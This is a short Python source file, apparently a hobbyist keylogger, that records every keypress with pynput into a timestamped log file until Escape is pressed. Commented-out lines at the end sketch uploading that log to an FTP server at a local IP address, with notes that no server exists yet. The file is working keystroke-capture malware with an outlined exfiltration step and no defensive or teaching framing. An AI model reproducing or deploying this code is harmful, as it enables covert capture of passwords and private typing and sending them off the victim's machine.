from pynput.keyboard import Key, Listener
import ftplib
import logging

log_directory = ""

logging.basicConfig(filename=(log_directory+"keylog-res.txt"),level=logging.DEBUG, format="%(asctime)s:%(message)s")


# TODO: refactor the output of the file to be human readable
def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key {0} was pressed")


# TODO: make this an arbitrary time frame instead of escape key
def releasing_key(key):
    if key == Key.esc:
        return False


print("Started Listening!")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

# TODO: Create an actual FTP Server to test this shit.
# Connects to a FTP Server, but none is provided. Leave this as commented.
# session = ftplib.FTP("192.168.0.101")

# with open("keylog-res.txt", "rb") as f:
    # session.storbinary("STOR keylog-res.txt", f)
    # session.quit()
